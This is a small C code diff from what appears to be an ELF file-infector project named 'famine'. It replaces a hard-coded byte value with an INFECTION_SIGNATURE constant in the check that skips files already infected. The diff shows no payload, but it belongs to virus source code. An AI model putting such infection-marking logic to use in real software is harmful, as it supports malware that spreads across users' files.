@@ -64,7 +64,7 @@ int check_elf_header(t_famine *famine)
     }
 
     // Check if file have already been infected
-    if (ehdr->e_ident[EI_PAD + 3] == 7)
+    if (ehdr->e_ident[EI_PAD + 3] == INFECTION_SIGNATURE)
     {
         error(ERROR_FILE_IS_ALREADY_INFECTED, famine);
         return -1;
